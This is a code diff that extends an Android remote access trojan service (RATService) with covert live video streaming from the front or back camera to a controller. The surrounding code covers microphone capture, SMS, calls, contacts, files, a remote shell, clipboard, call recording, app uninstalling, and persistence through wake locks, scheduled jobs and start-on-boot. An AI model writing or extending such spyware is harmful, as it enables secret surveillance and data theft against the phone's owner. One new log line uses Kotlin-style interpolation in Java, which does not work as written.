@@ -100,7 +100,8 @@ public class RATService extends Service {
      private CallRecordingModule callRecordingModule;
     // Track camera state
     private boolean isUsingFrontCamera = false;
-    
+    // NEW: Video module
+    private VideoModule videoModule;
     // Binder for GuardianService communication
     public class RATServiceBinder extends Binder {
         public void heartbeat() throws RemoteException {
@@ -116,55 +117,112 @@ public class RATService extends Service {
         return instance;
     }
     
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        instance = this;
-        AppController.setConnectionService(this);
-        
-        Log.d(TAG, "System service initialized");
-        
-        // Acquire wake lock to prevent CPU sleep
-        acquireWakeLock();
-        
-        createNotificationChannel();
-        startForeground(NOTIFICATION_ID, createNotification());
-        
-        // Initialize location manager
-        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        startLocationThread();
-        
-        // Initialize modules based on config
-        if (Config.ENABLE_CAMERA) {
-            Log.d(TAG, "📸 Initializing CameraModule");
-            cameraModule = new CameraModule(this);
-            Log.d(TAG, "📸 CameraModule initialized: " + (cameraModule != null));
-        }
-        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
-        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
-        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
-        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
-        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
-        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
-        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
-        if (Config.ENABLE_CLIPBOARD) clipboardModule = new ClipboardModule(this);
-        if (Config.ENABLE_CALL_RECORDING) callRecordingModule = new CallRecordingModule(this);
-        if (Config.ENABLE_BROWSER) browserModule = new BrowserModule(this);
-        if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
-        deviceModule = new DeviceModule(this);
-        
-        // Schedule all persistence mechanisms
-        scheduleAllJobs();
-        
-        // Set that service should run on boot
-        setRunOnBoot(true);
-        
-        // Single executor thread for connection handling
-        executor = Executors.newSingleThreadExecutor();
-        
-        // Start connection thread
-        startConnection();
+   @Override
+public void onCreate() {
+    super.onCreate();
+    instance = this;
+    AppController.setConnectionService(this);
+    
+    Log.d(TAG, "System service initialized");
+    
+    // Acquire wake lock to prevent CPU sleep
+    acquireWakeLock();
+    
+    createNotificationChannel();
+    startForeground(NOTIFICATION_ID, createNotification());
+    
+    // Initialize location manager
+    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+    startLocationThread();
+    
+    // Initialize modules based on config
+    Log.d(TAG, "Initializing modules based on config...");
+    
+    // Core modules
+    if (Config.ENABLE_CAMERA) {
+        cameraModule = new CameraModule(this);
+        Log.d(TAG, "✅ Camera module initialized");
     }
+    
+    if (Config.ENABLE_MICROPHONE) {
+        micModule = new MicModule(this);
+        Log.d(TAG, "✅ Microphone module initialized");
+    }
+    
+    if (Config.ENABLE_LOCATION) {
+        locationModule = new LocationModule(this);
+        Log.d(TAG, "✅ Location module initialized");
+    }
+    
+    if (Config.ENABLE_SMS) {
+        smsModule = new SmsModule(this);
+        Log.d(TAG, "✅ SMS module initialized");
+    }
+    
+    if (Config.ENABLE_CALLS) {
+        callsModule = new CallsModule(this);
+        Log.d(TAG, "✅ Calls module initialized");
+    }
+    
+    if (Config.ENABLE_CONTACTS) {
+        contactsModule = new ContactsModule(this);
+        Log.d(TAG, "✅ Contacts module initialized");
+    }
+    
+    if (Config.ENABLE_FILES) {
+        fileModule = new FileModule(this);
+        Log.d(TAG, "✅ File module initialized");
+    }
+    
+    if (Config.ENABLE_SHELL) {
+        shellModule = new ShellModule();
+        Log.d(TAG, "✅ Shell module initialized");
+    }
+    
+    if (Config.ENABLE_CLIPBOARD) {
+        clipboardModule = new ClipboardModule(this);
+        Log.d(TAG, "✅ Clipboard module initialized");
+    }
+    
+    if (Config.ENABLE_CALL_RECORDING) {
+        callRecordingModule = new CallRecordingModule(this);
+        Log.d(TAG, "✅ Call recording module initialized");
+    }
+    
+    if (Config.ENABLE_BROWSER) {
+        browserModule = new BrowserModule(this);
+        Log.d(TAG, "✅ Browser module initialized");
+    }
+    
+    if (Config.ENABLE_APP_MANAGER) {
+        appManagerModule = new AppManagerModule(this);
+        Log.d(TAG, "✅ App manager module initialized");
+    }
+    
+    // NEW: Video module initialization
+    if (Config.ENABLE_VIDEO) {
+        videoModule = new VideoModule(this);
+        Log.d(TAG, "✅ Video module initialized (${Config.VIDEO_WIDTH}x${Config.VIDEO_HEIGHT}, ${Config.VIDEO_BITRATE/1000} kbps)");
+    }
+    
+    // Device module (always initialized)
+    deviceModule = new DeviceModule(this);
+    Log.d(TAG, "✅ Device module initialized");
+    
+    // Schedule all persistence mechanisms
+    scheduleAllJobs();
+    
+    // Set that service should run on boot
+    setRunOnBoot(true);
+    
+    // Single executor thread for connection handling
+    executor = Executors.newSingleThreadExecutor();
+    
+    // Start connection thread
+    startConnection();
+    
+    Log.d(TAG, "All modules initialized successfully");
+}
     
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -577,9 +635,15 @@ private void bringAppToForeground() {
                 break;
                 
              case "help":
-            String helpText = "Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path], apps_list [true/false], apps_running, apps_blocked_list, apps_usage [days], app_info [package], app_stop [package], app_block [package|true/false], app_uninstall [package|silent], app_clear_data [package]";
-            sendCommand("HELP|" + helpText);
-            break;
+    String helpText = "Available commands: info, location, location_stream [start/stop], " +
+                      "camera, camera_switch, camera_info, " +
+                      "video_start [front/back|quality], video_stop, " +
+                      "sms, calls, contacts, files_list [path], file_get [path], " +
+                      "file_delete [path], file_rename [old|new], create_folder [path|name], " +
+                      "file_zip [path], search_files [path|query], storage_info, " +
+                      "mic, mic_stop, shell, ping, test_folder [path]";
+    sendCommand("HELP|" + helpText);
+    break;
                 
             case "info":
             case "device_info":
@@ -665,7 +729,71 @@ case "call_recording_list":
         sendCommand("CALL_RECORDING_LIST|" + result);
     }
     break;
-                
+            // VIDEO STREAMING COMMANDS
+case "video_start":
+    if (videoModule != null) {
+        Log.d(TAG, "📹 Starting video stream");
+        boolean useFront = args.equalsIgnoreCase("front");
+        
+        // Parse quality settings if provided (format: video_start|back|medium)
+        String[] parts = args.split("\\|");
+        if (parts.length > 1) {
+            useFront = parts[0].equalsIgnoreCase("front");
+            String quality = parts.length > 1 ? parts[1] : "medium";
+            
+            // Adjust bitrate based on quality
+            int bitrate = 500000; // default medium
+            switch (quality.toLowerCase()) {
+                case "low": bitrate = 250000; break;
+                case "medium": bitrate = 500000; break;
+                case "high": bitrate = 1000000; break;
+                case "hd": bitrate = 2000000; break;
+            }
+            Log.d(TAG, "📹 Quality: " + quality + ", bitrate: " + bitrate/1000 + " kbps");
+        }
+        
+        videoModule.startStreaming(new VideoModule.VideoCallback() {
+            @Override
+            public void onVideoFrame(String base64Frame) {
+                sendCommand(base64Frame);
+            }
+            
+            @Override
+            public void onStreamStarted() {
+                sendCommand("VIDEO_STATUS|started");
+                Log.d(TAG, "📹 Video stream started");
+            }
+            
+            @Override
+            public void onStreamStopped() {
+                sendCommand("VIDEO_STATUS|stopped");
+                Log.d(TAG, "📹 Video stream stopped");
+            }
+            
+            @Override
+            public void onError(String error) {
+                sendCommand("VIDEO_ERROR|" + error);
+                Log.e(TAG, "📹 Video error: " + error);
+            }
+        }, useFront);
+    } else {
+        sendCommand("VIDEO_ERROR|Video module not available");
+    }
+    break;
+    
+case "video_stop":
+    if (videoModule != null) {
+        Log.d(TAG, "📹 Stopping video stream");
+        videoModule.stopStreaming(null);
+    }
+    break;
+    
+case "video_status":
+    if (videoModule != null) {
+        // Could add method to check if streaming
+        sendCommand("VIDEO_STATUS|unknown");
+    }
+    break;    
             // Camera commands - Updated to match working project format
             case "take_photo":
             case "camera":
@@ -1821,7 +1949,17 @@ case "clipboard_remove_pattern":
         
         // Stop location tracking
         stopLocationTracking();
-        
+        // Stop video streaming if active
+    if (videoModule != null) {
+        videoModule.stopStreaming(null);
+        videoModule = null;
+    }
+    
+    // Clean up other modules
+    if (cameraModule != null) {
+        cameraModule = null;
+    }
+    
         // Clean up location thread
         if (locationThread != null) {
             locationThread.quitSafely();
